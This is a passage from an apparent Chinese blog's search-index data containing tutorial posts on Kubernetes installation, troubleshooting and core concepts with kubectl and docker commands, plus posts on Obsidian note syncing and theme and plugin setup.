scope\n\n其实很明显就是用户system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard没有相关权限\n\n修改dashboard-adminuser.yaml 如上文所示即可\n\n### 5.3 镜像拉取失败 GFW\n\nFailed to create pod sandbox: rpc error: code = Unknown desc = failed pulling image \"k8s.gcr.io/pause:3.1\": Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\nMountVolume.SetUp failed for volume \"kube-proxy\" : failed to sync configmap cache: timed out waiting for the condition\n\nFailed to pull image \"k8s.gcr.io/kube-proxy:v1.18.2\": rpc error: code = Unknown desc = Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1\ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 k8s.gcr.io/pause:3.1\n\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2 \ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2   k8s.gcr.io/kube-proxy:v1.18.2\n```\n\n### 5.4  calico无法启动\n\n Readiness probe failed: calico/node is not ready: felix is not ready: Get http://localhost:9099/readiness: dial tcp 127.0.0.1:9099: connect: connection refused\n\n修改calico.yaml, 增加`IP_AUTODETECTION_METHOD`环境变量, 在 IP 的下面\n\n```bash\n- name: IP\n\tvalue: \"autodetect\"\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=eth.*\"\n```\n\n重启calico\n\n```bash\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n\n\n### 5.5 node 无法 join\n\n [ERROR FileContent–proc-sys-net-ipv4-ip_forward]: /proc/sys/net/ipv4/ip_forward contents are not set to 1\n\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n\n\n# 6. 常用命令\n\n```bash\n# 查看状态\nkubectl get nodes --all-namespaces -o wide\nkubectl get pods --all-namespaces -o wide\n\n\n# 查看 pod 信息\nkubectl describe pods name\nkubectl describe pods -n kube-system name\n\n\n# 获取 token, 加入\nkubeadm token create --print-join-command\n\n\n# 清理\nkubeadm reset\nrm -rf /var/lib/cni/ && rm -rf /var/lib/calico/ && rm -rf /var/lib/kubelet/ && rm -rf /etc/cni/\nkubeadm init\n```\n\n\n\n# 7. 参考教程\n\n+ https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\n+ https://juejin.im/post/5d7fb46d5188253264365dcf\n+ https://juejin.im/post/5e1e96ef6fb9a02fbd378588\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8s的初次演练","url":"%2Fp%2F890e8359.html","content":"\nKubernetes中的大部分概念Node、Pod、Replication Controller、Service等都可以看作一种“资源对象”，几乎所有的资源对象都可以通过kubectl工具（API调用）执行增、删、改、查等操作并将其保存在etcd中持久化存储。\n\n从这个角度来看，kubernetes其实是一个高度自动化的资源控制系统，通过跟踪对比etcd库里保存的“资源期望状态”与当前环境中的“实际资源状态”的差异来实现自动控制和自动纠错的高级功能。\n\n<!-- more -->\n\n\n# 1. Kubernetes 本地安装\n\n我们需要安装以下东西：Kubernetes 的命令行客户端 kubctl、一个可以在本地跑起来的 Kubernetes 环境 Minikube。\n\n### 1.1 安装 k8s\n\n```bash\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nexclude=kube*\nEOF\n\n\n\nyum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes\nsystemctl enable kubelet && systemctl start kubelet\n```\n\n\n\n### 1.2 安装 minikube\n\nminikube 是一种轻量级的 Kubernetes 实现，可在本地计算机上创建 VM 并部署仅包含一个节点的简单集群。简单理解为一个运行在本地Node，我们可以在里面创建Pods来创建对应的服务.\n\n```bash\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \\\n   && sudo install minikube-linux-amd64 /usr/local/bin/minikube\n   \n   \nminikube start --vm-driver=none --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers\n```\n\n\n\n为什么增加后面的image-repository, 因为GFW总是会在无形中增加学习的难度. 请参考: https://github.com/kubernetes/minikube/issues/3860\n\nminikube 启动时会自动配置 kubectl，把它指向 Minikube 提供的 Kubernetes API 服务。可以用下面的命令确认：\n\n```bash\n$ kubectl config current-context\nminikube\n```\n\n\n\n# 2. 使用\n\n典型的 Kubernetes 集群包含一个 master 和多个 node。每个 node 上运行着维护 node 状态并和 master 通信的 kubelet。作为一个开发和测试的环境，Minikube 会建立一个有一个 node 的集群，用下面的命令可以看到：\n\n```bash\n$ kubectl get nodes\nNAME       STATUS    AGE       VERSION\nminikube   Ready     1h        v1.10.0\n```\n\n\n\n### 2.1 创建 docker 容器\n\n```bash\nmkdir html\necho '<h1>Hello Kubernetes!</h1>' > html/index.html\n```\n\n`Dockerfile`\n\n```dockerfile\nFROM nginx\nCOPY html/* /usr/share/nginx/html\n```\n\n创建:\n\n```bash\ndocker build -t k8s-demo:0.1 .\n```\n\n\n\n### 2.2 创建 pod\n\n`pod.yml`\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n    name: k8s-demo\n    labels:\n     app: k8s-demo\nspec:\n    containers:\n        - name: k8s-demo\n          image: k8s-demo:0.1\n          ports:\n              - containerPort: 80\n```\n创建:\n\n```bash\nkubectl create -f pod.yml\n \n\nkubectl get pods\n# NAME       READY     STATUS    RESTARTS   AGE\n# k8s-demo   1/1       Running   0          5s\n\n\n# 修改 pod.yml, 并应用\nkubectl apply -f pod.yml\n```\n\n\n\n虽然这个 pod 在运行，我们无法从外部直接访问。要把服务暴露出来，我们需要创建一个 Service。\n\nService 的作用有点像建立了一个反向代理和负载均衡器，负责把请求分发给后面的 pod。\n\n### 2.3 创建 service\n\n`svc.yaml`\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n    name: k8s-demo-svc\n    labels:\n        app: k8s-demo\nspec:\n    type: NodePort\n    ports:\n        - port: 80\n          nodePort: 30050\n    selector:\n        app: k8s-demo\n```\n\n这个 service 会把容器的 80 端口从 node 的 30050 端口暴露出来。\n\n注意文件最后两行的 selector 部分，这里决定了请求会被发送给集群里的哪些 pod。这里的定义是所有包含「app: k8s-demo」这个标签的 pod。\n\n\n\n查看标签命令:\n\n```bash\nkubectl describe pods | grep Labels\n```\n\n\n\n创建:\n\n```bash\nkubectl create -f svc.yml\n```\n\n\n\n用下面的命令可以得到暴露出来的 URL，在浏览器里访问，就能看到我们之前创建的网页了。\n\n```bash\nminikube service k8s-demo-svc --url\n# http://10.0.0.5:30050\n\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 2.4 创建 deployment\n\n在正式环境中我们需要让一个服务不受单个节点故障的影响，并且还要根据负载变化动态调整节点数量，所以不可能像上面一样逐个管理 pod。\n\nKubernetes 的用户通常是用 Deployment 来管理服务的。一个 deployment 可以创建指定数量的 pod 部署到各个 node 上，并可完成更新、回滚等操作。\n\n`deployment.yml`\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-demo-deployment\nspec:\n  replicas: 10\n  minReadySeconds: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 1\n      maxSurge: 1\n  template:\n    metadata:\n      labels:\n        app: k8s-demo\n    spec:\n      containers:\n        - name: k8s-demo-pod\n          image: k8s-demo:0.1\n          ports:\n            - containerPort: 80\n  selector:\n    matchLabels:\n      app: k8s-demo\n```\n\n创建:\n\n```bash\nkubectl create -f deployment.yml\n\n# 用下面的命令可以看到这个 deployment 的副本集（replica set），有 10 个 pod 在运行。\n\nkubectl get rs\n# NAME                             DESIRED   CURRENT   READY     AGE\n# k8s-demo-deployment-774878f86f   10        10        10        19s\n```\n\n\n\n假设我们对项目做了一些改动，要发布一个新版本。这里作为示例，我们只把 HTML 文件的内容改一下, 然后构建一个新版镜像 k8s-demo:0.2：\n\n```bash\necho '<h1>Hello Kubernetes22222222222!</h1>' > html/index.html\ndocker build -t k8s-demo:0.2 .\n\n# 替换 deployment.yml 的 tag 值\n\n# 重新应用 deployment\nkubectl apply -f deployment.yml --record=true\n```\n\n\n\n此时我们访问\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes22222222222!\n```\n\n\n\n回滚版本1\n\n``` bash\nkubectl rollout undo deployment k8s-demo-deployment --to-revision=1\n\n# 可以查看回滚进度\nkubectl rollout status deployment k8s-demo-deployment\n```\n\n\n\n再次访问\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 2.5 总结\n\nPod(内含docker 容器) ->  service 暴露 pod\n\ndeployment 管理Pod到node，并进行版本相关控制。\n\n# 3. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/39937913\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8s的入门与实践","url":"%2Fp%2F40c9599.html","content":"\n在容器编排领域，比较著名的主要有三个：Kubernetes, Mesos, 及 Docker 自家的 Swarm。\n\n<!-- more -->\n\n# 1.  架构\n\nKubernetes架构可简单分为主（Master）节点、从（工作/Worker/Node）节点和数据库Etcd。其中主节点为集群的控制单元，一般不会运行业务应用程序，主要包含的组件有Kube-APIServer、Kube-ControllerManager、Kube-Scheduler。\n\n从节点为工作节点，也就是部署应用程序容器的节点，主要包含的组件有Kubelet、Kube-Proxy，当然如果Master节点也要部署容器，也会包含这两个组件。\n\n<img src=\"k8s的入门与实践/image-20230911083822805.png\" alt=\"image-20230911083822805\" style=\"zoom:50%;\" />\n\nEtcd集群可以和Master节点部署在同一个宿主机，也可以单独部署，生产环境建议部署大于3的奇数台Etcd节点实现Etcd集群的高可用。\n\n<img src=\"k8s的入门与实践/1.jpeg\" alt=\"1\" style=\"zoom:40%;\" />\n\n### 1.1 Master节点\n\nMaster节点是Kubernetes集群的控制节点，在生产环境中不建议部署集群核心组件外的任何容器。Master节点是Kubernetes集群的控制节点，在生产环境中不建议部署集群核心组件外的任何容器。\n\n##### 1. API Server\n\n整个集群的控制中枢，提供集群中各个模块之间的数据交换，并将集群状态和信息存储到分布式键-值（key-value）存储系统Etcd集群中。同时，它也是集群管理、资源配额、提供完备的集群安全机制的入口，为集群各类资源对象提供增删改查以及watch的REST API接口。APIServer作为Kubernetes的关键组件，使用Kubernetes API和JSON over HTTP提供Kubernetes的内部和外部接口。\n\n##### 2. Scheduler\n\n集群Pod的调度中心，主要通过调度算法将Pod分配到最佳的Node节点，它通过APIServer监听所有Pod的状态，一旦发现新的未被调度到任何Node节点的Pod（PodSpec.NodeName为空），就会根据一系列策略选择最佳节点进行调度，对每一个Pod创建一个绑定（Binding），然后被调度的节点上的Kubelet负责启动该Pod。\n\n##### 3. Controller Manager\n\n集群状态管理器（它的英文直译名为控制器管理器），以保证Pod或其他资源达到期望值。当集群中某个Pod的副本数或其他资源因故障和错误导致无法正常运行，没有达到设定的值时，Controller Manager会尝试自动修复并使其达到期望状态。\n\n##### 4. Cluster state store\n\n存储集群所有需持久化的状态，并且提供 watch 的功能支持，可以快速的通知各组件的变更等操作。\n\n因为目前 Kubernetes 的存储层选择是 etcd ，所以一般情况下，大家都直接以 etcd 来代表集群状态存储服务。即：将所有状态存储到 etcd 实例中。Master 相当于是 K8S 集群的大脑，更细化来看，etcd 则是大脑中的核心。\n\n### 1.2 Node 节点\n\nNode节点也被称为Worker、Node和Minion，是主要负责部署容器（工作负载）的单机（或虚拟机），集群中的每个节点都必须具备容器的Runtime（运行时），比如Docker或其他遵循CRI标准的Runtime等。\n\nKubelet作为守护进程运行在Node节点上，负责监听该节点上所有的Pod，同时负责上报该节点上所有Pod的运行状态，确保节点上的所有容器都能正常运行。当Node节点宕机或故障（NotReady状态）时，该节点上运行的Pod会被自动转移到其他节点上。\n\n##### 1. Kubelet\n\n负责与Master通信协作，管理该节点上的Pod，对容器进行健康检查及监控，同时负责上报节点和节点上面Pod的状态。\n\n##### 2. Kube Proxy\n\n我们都知道，想要访问某个服务，那要么通过域名，要么通过 IP。而每个 Pod 在创建后都会有一个虚拟 IP，K8S 中有一个抽象的概念，叫做 `Service` ，`kube-proxy` 便是提供一种代理的服务，让你可以通过 `Service` 访问到 Pod。\n\n实际的工作原理是在每个 Node 上启动一个 `kube-proxy` 的进程，通过编排 `iptables` 规则来达到此效果。\n\n##### 3. Container runtime\n\n容器运行时最主要的功能是下载镜像和运行容器，我们最常见的实现可能是 Docker , 目前还有其他的一些实现，比如 rkt, cri-o。\n\nK8S 提供了一套通用的容器运行时接口 CRI (Container Runtime Interface), 凡是符合这套标准的容器运行时实现，均可在 K8S 上使用。\n\n\n\n### 1.3 其他组件\n\n##### 1. CoreDNS\n\n用于Kubernetes集群内部Service的解析，可以让Pod把Service名称解析成Service的IP，然后通过Service的IP地址连接到对应的应用上。\n\n##### 2. Calico\n\n符合CNI标准的一个网络插件，它负责给每个Pod分配一个不会重复的IP，并且把每个节点当作一个“路由器”，这样一个节点的Pod就可以通过IP地址访问其他节点的Pod。\n\n\n\n### 1.4 Pod的概念\n\n为什么Kubernetes不直接管理容器还要设计一个Pod呢？接下来我们带着这个问题学习Kubernetes最小的单元——Pod。\n\n在实际使用时，单个容器是无法单独来支撑我们的应用，往往需要很多微服务才能组成一个系统，并且还会存在A服务依赖B服务，B服务需要和C服务共用某个目录，实现数据共享。\n\nDocker只是容器Runtime（运行时）中的一种，市面上还有很多容器的Runtime，比如Rkt、CRI-O等，而Kubernetes作为目前最流行的容器编排工具，需要支持各个Runtime并且不依赖于底层Runtime的实现技术，于是就抽象了Pod这个概念，用于管理多个紧密相连的符合CRI标准的容器。\n\n<img src=\"k8s的入门与实践/image-20230911085337138.png\" alt=\"image-20230911085337138\" style=\"zoom:80%;\" />\n\nPod可简单地理解为一组、一个或多个容器，每个Pod还包含一个Pause容器，Pause容器是Pod的父容器，它主要负责僵尸进程的回收管理，同时通过Pause容器可以使同一个Pod里面的不同容器共享存储、网络、PID、IPC等，容器之间可以使用localhost:port相互访问，可以使用Volume等实现数据共享。\n\n##### 1. 创建一个pod\n\n在生产环境中，很少单独运行一个Pod，因为单独创建的Pod并不能实现一些高级的发布策略，所以在实际使用中经常会用Deployment、DaemonSet、StatefulSet 等高级控制器调度并管理Pod。\n\n<img src=\"k8s的入门与实践/CB_3300028184_Figure-P97_132954.jpg\" alt=\"img\" style=\"zoom:100%;\" />\n\n<img src=\"k8s的入门与实践/CB_3300028184_Figure-P98_132955.jpg\" alt=\"img\" style=\"zoom:100%;\" />\t\n\n```bash\nkubectl create -f pod.yaml\n\n# pod/nginx created\n```\n\n\n\n# 2. 调度基础\n\n### 2.1 RC 和 RS\n\nReplication Controller(复制控制器，RC)和ReplicaSet(复制集，RS)是两种简单部署Pod的方式。目前很少单独被使用，都是使用更高级的资源Deployment、DaemonSet、StatefulSet管理Pod。\n\n##### Replication Controller\n\nReplication Controller可以确保Pod副本数达到期望值，也就是RC定义的数量。Replication Controller类似于进程管理程序，但是Replication Controller不是监视单个节点上的各个进程，而是监视多个节点上的多个Pod。\n\n##### ReplicaSet\n\n和Replication Controller唯一的区别是，ReplicaSet支持标签选择器。在实际应用中，虽然ReplicaSet可以单独使用，但是一般建议使用Deployment来自动管理ReplicaSet。\n\n### 2.2 无状态应用管理Deployment\n\nDeployment是一个更高级的概念，它管理ReplicaSet 并为Pod和ReplicaSet 提供声明性更新以及许多其他有用的功能，所以建议在生产环境下使用Deployment代替 ReplicaSet。\n\n##### 1. 创建\n\n<img src=\"k8s的入门与实践/image-20230911091444810.png\" alt=\"image-20230911091444810\" style=\"zoom:50%;\" />\n\n示例解析：\n\n+ nginx-deployment：Deployment的名称。\n+ replicas：创建Pod的副本数。\n+ selector：定义Deployment如何找到要管理的Pod，与template的label（标签）对应，apiVersion为apps/v1必须指定该字段。\n+ template字段包含以下字段：\n  + app: nginx 使用label（标签）标记Pod。\n  + spec：表示Pod运行一个名字为nginx的容器。\n  + image：运行此Pod使用的镜像。\n  + Port：容器用于发送和接收流量的端口。\n\n```bash\nkubectl create -f dp-nginx.yaml\n\n# deployment.apps/nginx-deployment created\n\n\nkubectl get deploy\nNAME \t\t\t\t\t\tDESIRED CURRENT UP-TO-DATE AVAILABLE AGE\nnginx-deployment 3 \t\t\t3 \t\t\t\t3\t\t\t\t\t 1\t\t\t 60s\n```\n\n+ NAME：集群中Deployment的名称。\n+ DESIRED：应用程序副本数。\n+ CURRENT：当前正在运行的副本数。\n+ UP-TO-DATE：显示已达到期望状态的被更新的副本数。\n+ AVAILABLE：显示用户可以使用的应用程序副本数，当前为1，因为部分Pod仍在创建过程中。\n+ AGE：显示应用程序运行的时间。\n\n##### 2.  更新\n\n通过Deployment部署应用后，经常会有Deployment文件的配置更改或者镜像版本迭代的需求，更改配置后该Deployment会创建新的ReplicaSet，之后会对管理的Pod进行滚动升级。\n\n假如更新Nginx Pod的image使用nginx:1.9.1，并使用--record记录当前更改的参数，后期回滚时可以查看到对应的信息：\n\n```bash\nkubectl set image deployment nginx-deployment nginx=nginx:1.9.1 --record \n\n# deployment.extensions/nginx-deployment image updated\n```\n\n更新过程为新旧交替更新，首先新建一个Pod，当Pod状态为Running时，删除一个旧的Pod，同时创建一个新的Pod。当触发一个更新后，会有新的ReplicaSet产生，旧的ReplicaSet会被保存，查看此时的ReplicaSet，可以从AGE或READY看出新旧ReplicaSet。\n\n```bash\nkubectl get rs\n\nNAME DESIRED CURRENT READY AGE\nnginx-deployment-5c689d88bb 0 0 0 34m\nnginx-deployment-6987cdb55b 3 3 3 5m14s\n```\n\n\n\n##### 3. 回滚\n\n当更新的版本不稳定或配置不合理时，可以对其进行回滚操作，假设我们又进行了几次更新（此处以更新镜像版本触发更新，更改配置效果类似）：\n\n```bash\nkubectl set image deployment nginx-deployment nginx=dotbalo/canary:vl --record \n\nkubectl set image deployment nginx-deployment nginx=dotbalo/canary:v2 --record\n```\n\n\n\n如果只需要回滚到上一个稳定版本，使用kubectl rollout undo即可，如果要回滚到指定版本，使用--to-revision参数。\n\n```bash\nkubectl rollout undo deployment/nginx-deployment \n#deployment.apps/nginx-deployment\n\nkubectl rollout undo deployment/nginx-deployment\t--to-revision=2 \n# deployment.extensions/nginx-deployment\n```\n\n##### 4. 扩容\n\n当公司访问量变大，或者有预期内的活动时，3个Pod可能已无法支撑业务时，可以提前对其进行扩展。使用kubectl scale动态调整Pod的副本数，比如增加Pod为5个。\n\n```bash\nkubectl scale deployment.v1.apps/nginx-deployment--replicas=5 \n\n#deployment.apps/nginx-deployment scaled\n```\n\n\n\n### 2.3 有状态应用管理StatefulSet\n\nStatefulSet主要用于管理有状态应用程序的工作负载API对象。比如在生产环境中，可以部署ElasticSearch集群、MongoDB集群或者需要持久化的RabbitMQ集群、Redis集群、Kafka集群和ZooKeeper集群等。\n\n\n\n### 2.4 守护进程集 Daemonset\n\n有时候我们需要在每个Kubernetes节点或符合条件的节点上都部署某个应用，那么就可以使用Kubernetes的DaemonSet调度Pod。DaemonSet确保全部（或者某些符合条件）节点上运行一个Pod副本。当有新节点加入集群时，也会为它们新增一个Pod，当节点从集群中移除时，这些Pod也会被回收，删除DaemonSet将会删除它创建的所有Pod。\n\n\n\n使用DaemonSet的一些典型用法：\n\n+ 运行集群存储daemon（守护进程），例如在每个节点上运行Glusterd、Ceph等。\n+ 在每个节点上运行日志收集daemon，例如Fluentd、Logstash。\n+ 在每个节点上运行监控daemon，比如Prometheus Node Exporter、Collectd、Datadog代理、New Relic代理或Ganglia gmond。\n\n# 5. 部署实践\n\nPod 是 K8S 中最小的调度单元，所以我们无法直接在 K8S 中运行一个 container 但是我们可以运行一个 Pod 而这个 Pod 中只包含一个 container 。\n\n```bash\n➜  ~ kubectl run redis --image='redis:alpine' \n\ndeployment.apps/redis created\n```\n\n我们使用 `kubectl get all` 来看看到底发生了什么。\n\n```bash\n➜  ~ kubectl get all\n\nNAME                         READY     STATUS    RESTARTS   AGE\npod/redis-7c7545cbcb-2m6rp   1/1       Running   0          30s\n\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE\nservice/kubernetes   ClusterIP   10.96.0.1    <none>        443/TCP   32s\n\nNAME                    DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/redis   1         1         1            1           30s\n\nNAME                               DESIRED   CURRENT   READY     AGE\nreplicaset.apps/redis-7c7545cbcb   1         1         1         30s\n```\n\n可以看到其中有我们刚才执行 `run` 操作后创建的 `deployment.apps/redis`，还有 `replicaset.apps/redis-7c7545cbcb`, `service/kubernetes` 以及 `pod/redis-7c7545cbcb-f984p`。这些分别代表什么含义？\n\n### 5.1 Deployment\n\n`Deployment` 是一种高级别的抽象，允许我们进行扩容，滚动更新及降级等操作。我们使用 `kubectl run redis --image='redis:alpine` 命令便创建了一个名为 `redis` 的 `Deployment`，并指定了其使用的镜像为 `redis:alpine`。\n\n同时 K8S 会默认为其增加一些标签（Label）。我们可以通过更改 get 的输出格式进行查看。\n\n```bash\n➜  ~ kubectl get deployment.apps/redis -o wide \nNAME      DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE       CONTAINERS   IMAGES         SELECTOR\nredis     1         1         1            1           40s       redis        redis:alpine   run=redis\n\n\n➜  ~ kubectl get deploy redis -o wide          \nNAME      DESIRED   CURRENT   UP-TO-DATE   AVAILABLE   AGE       CONTAINERS   IMAGES         SELECTOR\nredis     1         1         1            1           40s       redis        redis:alpine   run=redis\n```\n\n\n\n`Deployment` 的创建除了使用我们这里提到的方式外，更推荐的方式便是使用 `yaml` 格式的配置文件。在配置文件中主要是声明一种预期的状态，而其他组件则负责协同调度并最终达成这种预期的状态。\n\nDeployment的作用，还有将 `Pod` 托管给下面将要介绍的 `ReplicaSet`。\n\n### 5.2 ReplicaSet\n\n`ReplicaSet` 是一种较低级别的结构，允许进行扩容。`ReplicaSet` 可简写为 `rs`，通过以下命令查看：\n\n```bash\n➜  ~ kubectl get rs -o wide\n\nNAME               DESIRED   CURRENT   READY     AGE       CONTAINERS   IMAGES         SELECTOR                           \nredis-7c7545cbcb   1         1         1         11h       redis        redis:alpine   pod-template-hash=3731017676,run=redis\n```\n\n在输出结果中，我们注意到这里除了我们前面看到的 `run=redis` 标签外，还多了一个 `pod-template-hash=3731017676` 标签，这个标签是由 `Deployment controller` 自动添加的，目的是为了防止出现重复，所以将 `pod-template` 进行 hash 用作唯一性标识。\n\n### 5.3 Service\n\n`Service` 简单点说就是为了能有个稳定的入口访问我们的应用服务或者是一组 `Pod`。通过 `Service` 可以很方便的实现服务发现和负载均衡。\n\n```bash\n➜  ~ kubectl get service -o wide\n\nNAME         TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE       SELECTOR\nkubernetes   ClusterIP   10.96.0.1    <none>        443/TCP   16m        <none>\n```\n\n\n\n### 5.4 将Service暴露出来\n\n接下来我们将刚才部署的 Redis 服务暴露出来。\n\n```bash\n➜  ~ kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-server  \nservice/redis-server exposed\n\n➜  ~ kubectl get svc -o wide                                                                       \nNAME           TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE       SELECTOR\nkubernetes     ClusterIP   10.96.0.1       <none>        443/TCP    49m       <none>\nredis-server   ClusterIP   10.108.105.63   <none>        6379/TCP   4s        run=redis\n```\n\n现在我们的 redis 是使用的默认类型 `ClusterIP`，所以并不能直接通过外部进行访问，我们使用 `port-forward` 的方式让它可在集群外部访问。\n\n```bash\n➜  ~ kubectl port-forward svc/redis-server 6379:6379\n\nForwarding from 127.0.0.1:6379 -> 6379\nForwarding from [::1]:6379 -> 6379\nHandling connection for 6379\n```\n\n在另一个本地终端内可通过 redis-cli 工具进行连接：\n\n```bash\n➜  ~ redis-cli -h 127.0.0.1 -p 6379\n\n127.0.0.1:6379> ping\nPONG\n```\n\n当然，我们也可以使用 `NodePort` 的方式对外暴露服务。\n\n```bash\n➜  ~ kubectl expose deploy/redis --port=6379 --protocol=TCP --target-port=6379 --name=redis-server-nodeport --type=NodePort\nservice/redis-server-nodeport exposed\n\n➜  ~ kubectl get service/redis-server-nodeport -o wide \nNAME                    TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE       SELECTOR\nredis-server-nodeport   NodePort   10.109.248.204   <none>        6379:31913/TCP   11s       run=redis\n```\n\n我们可以通过任意 `Node` 上的 31913 端口便可连接我们的 redis 服务。\n\n### 5.5 Pod\n\n `Pod` 是 K8S 中的最小化部署单元，我们看下当前集群中 `Pod` 的状态。\n\n```bash\n➜  ~ kubectl get pods\n\nNAME                     READY     STATUS    RESTARTS   AGE\nredis-7c7545cbcb-jwcf2   1/1       Running   0          8h\n```\n\n我们进行一次简单的扩容操作。\n\n```bash\n➜  ~ kubectl scale deploy/redis --replicas=2\ndeployment.extensions/redis scaled\n\n➜  ~ kubectl get pods\nNAME                     READY     STATUS    RESTARTS   AGE\nredis-7c7545cbcb-jwcf2   1/1       Running   0          8h\nredis-7c7545cbcb-wzh6w   1/1       Running   0          4s\n```\n\n可以看到 `Pod` 数已经增加，并且也已经是 `Running` 的状态了。(当然在生产环境中 Redis 服务的扩容并不是使用这种方式进行扩容的，需要看实际的部署方式以及业务的使用姿势。)\n\n\n\n# 6. 参考资料\n\n+ https://kubernetes.io/zh/docs/tutorials/hello-minikube/\n+ https://www.bookstack.cn/read/kubernetes-handbook/concepts-index.md\n+ https://www.bilibili.com/video/BV1w4411y7Go\n+ https://learn.lianglianglee.com\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"obsidian的同步策略","url":"%2Fp%2Fde419055.html","content":"\n# 1. iCloud 同步\n\n### 1.1 iCloud 同步标记\n\n- 关闭的云彩 【不可同步】\n- 虚线云彩【正在同步】\n- 实心云彩 【同步完成】\n- 云彩下箭头 【其他端有，当前设备没有】\n\n<!-- more -->\n\n### 1.2 卡住问题解决\n\n- 什么也不做。\n- 重启大法，包括重置进程、重启网络、重开电脑、重新登录 Apple ID 以及重装系统。重置进程就是通过 `killall bird` 和 `killall cloudd` 两个命令，将 iCloud 云盘最紧密的两个进程 bird 和 cloudd 进程手动杀死。\n- 第三个办法就是 **引导系统重新建立 CloudDocs 文件夹**，这个解决方案来自 [StackExchange](https://sspai.com/link?target=https%3A%2F%2Fapple.stackexchange.com%2Fquestions%2F313716%2Ficloud-drive-wont-sync-on-mac)。\n\n```bash\nkillall bird    # 结束 bird 这一 iCloud 文件同步的核心进程\nkillall cloudd    # 结束 cloudd 这一 iCloud 文件同步的核心进程\ncd ~/Library/Application\\ Support    # 终端要处理的文件夹转换到用户资源库\nmv CloudDocs CloudDocsOld   # 将原本 Application Support 文件夹中的 CloudDocs 文件夹重新命名成为 CloudDocsOld\n```\n\n### 1.3 工具\n\n使用 [Circus](https://sspai.com/link?target=https%3A%2F%2Feclecticlightdotcom.files.wordpress.com%2F2021%2F04%2Fcirrus112.zip) 这款小工具，来可视化 iCloud 中文件的同步进程。这款工具可以帮助你查看上文中提到的 log、查看当前 iCloud 文件的状态、下载当前 iCloud 云盘中存储的文件，或者是将存储在本地的 iCloud 文件清除。\n\n管理 iCloud 文件，也还可以使用 [Bailiff](https://sspai.com/link?target=https%3A%2F%2Feclecticlightdotcom.files.wordpress.com%2F2020%2F08%2Fbailiff15.zip) 这款小工具 —— 它可以帮助你在菜单栏控制某个文件是否应当保存在云端，或者是留在本地。\n\n下载地址：https://eclecticlight.co/downloads/\n\n\n\n# 2. Git 插件\n\nhttps://github.com/denolehov/obsidian-git\n\n安装插件开箱即用。\n\n\n\n# 3. Remote Save 插件\n\nhttps://github.com/remotely-save/remotely-save \n\n可以配置Dropbox使用。\n\n\n\n# 4. 其他同步方案\n\n+ https://forum.obsidian.md/t/mobile-setting-up-ios-git-based-syncing-with-mobile-app-using-working-copy/16499\n+ https://forum.obsidian.md/t/workflow-to-sync-dropbox-files-to-a-local-ios-vault/26466\n+ [Obsidian 免费的实时同步服务](https://irithys.com/p/obsidian-livesync/)\n\n\n\n# 5. 参考文档\n\n- https://sspai.com/post/72882\n","tags":["obsidian"],"categories":["笔记"]},{"title":"obsidian笔记的使用","url":"%2Fp%2F2730ea4.html","content":"\n\nObsidian是基于 Markdown文件的本地强大知识管理软件，就让Obsidian作为你的第二大脑吧。\n\n<!-- more -->\n\n# 1. 主题配置\n\n### 1.1 主题推荐\n\n- Minimal [推荐]\n- Things\n\n### 1.2 Things 调整行宽\n\n设置-> 外观 -> CSS 代码片段\n\n<img src=\"obsidian%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/1.jpg\" style=\"zoom:50%;\" />\n\n`width.css`\n\n```\nbody {\n\t/*--file-line-width: 100%;*/\n\t--file-line-width: 1350px;\n}\n```\n\n### 1.3 Minimal 调整行宽\n\nMinimal Theme Settings 插件 -> Typography -> Maximum line width : 95%\n\n\n\n# 2. 使用插件\n\n<img src=\"obsidian%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/2.jpg\" alt=\"image-20221207144431613\" style=\"zoom: 33%;\" />\n\n### 2.1 使用插件介绍\n\n+ Admonition ：markdown好看标识\n+ ~~Calendar：日期插件~~\n+ Clear Unused Images：清理未引用的图片\n+ Code Editor Shortcuts：类似vscode编辑快捷键设置，例如 